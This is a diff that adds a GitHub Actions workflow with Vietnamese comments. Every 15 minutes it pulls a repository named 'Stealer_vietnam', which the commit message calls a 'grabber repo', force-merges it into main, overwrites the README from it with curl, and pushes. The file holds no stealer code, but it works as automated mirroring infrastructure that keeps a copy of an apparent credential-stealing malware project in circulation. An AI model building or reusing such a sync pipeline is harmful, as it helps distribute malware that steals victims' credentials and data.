@@ -1,0 +1,47 @@
+name: Sync Repository
+
+on:
+  schedule:
+    - cron: '*/15 * * * *'  # Chạy mỗi 15 phút
+  workflow_dispatch:  # Cho phép kích hoạt thủ công
+
+permissions:
+  contents: write
+
+jobs:
+  sync:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout destination repository
+      uses: actions/checkout@v2
+      with:
+        ref: main  # Nhánh bạn muốn đồng bộ, thay đổi nếu cần
+
+    - name: Set up git
+      run: |
+        git config --global user.name 'github-actions[bot]'
+        git config --global user.email 'github-actions[bot]@users.noreply.github.com'
+
+    - name: Add source repository as remote
+      run: git remote add source https://github.com/s1uiasdad/Stealer_vietnam.git
+
+    - name: Fetch source repository
+      run: git fetch source
+
+    - name: Merge changes
+      run: |
+        git merge source/main --allow-unrelated-histories || true
+        git merge --strategy-option theirs source/main -m "Merge changes from source" || true
+
+    - name: Replace README.md
+      run: |
+        curl -o README.md https://raw.githubusercontent.com/s1uiasdad/Stealer_vietnam/main/README.md
+
+    - name: Commit and push changes
+      run: |
+        git add README.md
+        git commit -m "Replace README.md with content from grabber repo" || true
+        git push origin main
+      env:
+        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
